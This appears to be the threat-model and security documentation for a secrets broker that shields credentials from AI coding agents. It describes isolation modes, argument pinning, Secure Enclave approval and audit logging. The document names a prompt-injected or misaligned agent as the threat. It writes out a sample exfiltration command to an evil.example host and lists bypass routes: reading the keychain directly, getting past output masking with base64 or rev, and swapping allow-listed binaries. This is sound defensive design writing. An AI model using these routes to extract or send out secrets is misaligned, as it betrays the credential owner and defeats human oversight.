# Security & threat model

`sb doctor` tells you which mode you are in and what it implies. Read this
before trusting the broker as a boundary.

## Modes

| | single-uid (default) | isolated (`sudo sb install`) |
|---|---|---|
| broker runs as | you | a hidden service account (`_secretsbroker`) |
| transport | stdio | unix socket, group-restricted |
| vault, master password, policy, audit | owned by you — agent can read them | owned by the broker — agent cannot |
| an agent with a shell can | bypass the broker completely | only call the socket API |
| what you get | policy, masking, audit: traceability, not a boundary | an actual boundary |

Both modes run the same policy code.

## What holds in isolated mode

- **Secrets never enter the agent's context.** There is no `get_secret` tool;
  values flow only broker → child process environment. Tool responses carry
  refs, masked stdout/stderr, or the ref of a newly stored secret.
- **The master password is out of the agent's reach.** It lives in a 0600 file
  owned by the service account (`sb set-password`), not in your login keychain
  where any process running as you could read it with `security -w`.
- **Destination binding.** Each policy item pins which executables may receive
  a secret *and* the exact arguments they may be run with. `sb allow ... --
  api /user` permits `gh api /user` and nothing else — not `gh api /user -H
  "Authorization: <secret>" https://evil.example`, because appending is where
  exfiltration lives. A trailing `...` (`-- api ...`) opts back into prefix
  matching when the remaining arguments genuinely cannot be enumerated; that
  is weaker, and `sb doctor` does not flag it, so use it deliberately.
- **Human approval, bound to one request (Secure Enclave).** `sb allow
  --approve` gates a ref. In single-uid mode the broker prompts directly. In
  isolated mode the daemon cannot prompt, so approval is a Secure Enclave
  signature: an exec that needs gated refs returns `APPROVAL REQUIRED` with a
  nonce covering all of them; `sb approve --request <nonce>` signs it with a
  biometric-per-use key created at install, and the daemon verifies the
  signature against the registered public key. The signature covers the nonce
  AND the daemon's description of the command, so a grant cannot be moved to
  another request and a misleading prompt cannot yield a valid approval. No
  root: signing runs as the console user, verification is a public-key check.
  With no key registered, isolated approval fails closed. See
  [approval.md](approval.md).
- **Vault writes are opt-in, default-deny** (`sb write-allow`), in three
  separate grants, each decided from the policy file on every call (revoking
  one takes effect on the next call, no restart):
  - `create` — new entries only.
  - `add-fields` — fields an existing entry lacks or has empty, such as a TOTP
    seed on a login. It never overwrites a stored value, so it cannot be used
    to substitute a credential — nor set the fields that decide which sites a
    login is offered on (URL, KeePassXC-Browser's `KP2A_URL*` and `KPH:`
    attributes), even when empty: pointing an entry's blank URL at a phishing
    origin would make your own browser extension offer that password there.
  - `update` — overwrite stored values. The dangerous one: swapping the GitHub
    password hijacks every later login.

  A change to an existing entry keeps the fields it does not name and puts the
  previous version in the entry's history, where KeePassXC can restore it.
  Adapters refuse fields they cannot store instead of dropping them, and a
  TOTP seed is validated (the parser `sb-cdpfill` uses to mint codes) before
  it is written.
- **Fail-closed unlock.** Wrong master passwords produce sticky errors; the
  broker never prompts, so an agent cannot phish one.
- **Audit log.** Every resolve/exec decision is appended (JSONL) with ref,
  executable, decision and reason — never values — to a file the agent cannot
  rewrite.

## Threat model

**In scope:** a prompt-injected or misaligned agent that speaks to the broker
over MCP, and (in isolated mode) one that also has a shell as your user.

**Out of scope, stated plainly:**

- **Single-uid mode is not a boundary.** An agent with a shell reads the
  keychain (`security find-generic-password -w`) or the vault file directly.
  Every CLI coding agent has a shell. Use isolated mode, or treat this as a
  policy and audit layer and size your trust accordingly.
- **Output masking is not containment.** It byte-matches resolved values in
  child output, so `base64`, `tr` or `rev` walk straight through it. It
  prevents accidental echo, not a hostile child. This is why `sb allow`
  refuses shells, interpreters and generic network clients: allow-listing
  `/bin/sh` is equivalent to allow-listing everything.
- **An allow-listed binary you can't trust is not a boundary.** A binary the
  agent's user can overwrite can be replaced with one that prints its
  environment; `/opt/homebrew/bin` is group-writable on macOS. `sb allow`
  refuses non-root-owned paths unless you pass `--force`.
- **Use is not safety.** An agent that can use a credential can do whatever
  that credential allows. Allow `gh` and the agent acts as you on GitHub — it
  just never learns the password.
- **Destination binding is per-executable, not per-network-destination.** Once
  a credential is in an allowed process, that process decides where it goes.
  For local tools you can close this with `sb allow … --no-network`, which
  runs the child (and its descendants) with no network access at all:
  `sandbox-exec` on macOS, an empty network namespace
  (`CLONE_NEWUSER|CLONE_NEWNET`) on Linux. There is deliberately no per-*host*
  egress allow-list: enforcing one would mean terminating the child's TLS, and
  a hostname list defeated by an IP literal or a redirect would be worse than
  none. `network: none` is the honest, enforceable unit.

  It **fails closed**. On Linux the jail can only be refused when the child is
  spawned — unprivileged user namespaces are disabled by the default
  Docker/Podman seccomp profile, by `kernel.unprivileged_userns_clone=0` on
  older Debian/Ubuntu, and on some hardened kernels. In that case the exec is
  refused with a message naming the cause; the secret is never handed to an
  unconfined process.
- **`--host=` is browser-fill scoping, not egress control.** It restricts which
  web origin the browser integration may fill a credential into. It does not
  constrain where an allow-listed executable sends it.
- **Browser fills are not hidden from whoever drives the browser.** Both
  browser paths — the KeePassXC-Browser extension's `get-logins` and
  `sb-cdpfill` — end with the credential typed into a page, and an agent that
  drives that Chrome over CDP can read the field back. What they enforce is
  *where* a credential may be typed (exact origin, deny-by-default per ref)
  and that it never passes through the agent's transcript unless the agent
  goes looking. Against a hostile agent in the same browser, they are policy,
  not a boundary.

- **Static secrets cannot expire.** A `.kdbx` or `.opvault` password is
  long-lived by nature; there is no just-in-time equivalent for it here.
- **Root, or passwordless sudo, ends the discussion.** So does malware that
  can read the broker's memory. 1Password's own
  [security white paper](https://agilebits.github.io/security-design/leopard.html)
  concedes the same
  ground ("there's no way in principle to protect other processes running on
  that system"); no password manager solves it.
